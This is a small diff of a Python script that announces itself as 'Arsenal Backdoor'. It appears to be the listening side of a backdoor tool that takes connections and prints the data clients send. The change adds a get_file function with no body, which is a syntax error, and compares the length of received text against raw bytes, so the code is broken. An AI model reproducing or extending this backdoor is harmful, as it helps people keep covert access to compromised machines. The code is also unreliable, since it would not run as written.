@@ -9,12 +9,17 @@ args = parser.parse_args()
 if args.host is None:
     args.host = '0.0.0.0'
 
+def get_file(filename):
+
+
 def client(conn, addr, buff):
-    holder = []
     conn.send(b'Arsenal Backdoor\n')
     while True:
-        data = conn.recv(buff)
-        holder.append(str(data.strip(), 'utf-8'))
+        holder = []
+        length = conn.recv(buff)
+        while len(''.join(holder)) < length:
+            data = conn.recv(buff)
+            holder.append(str(data.strip(), 'utf-8'))
         print(addr[0]+':\n'+''.join(holder))
         while True:
             try:
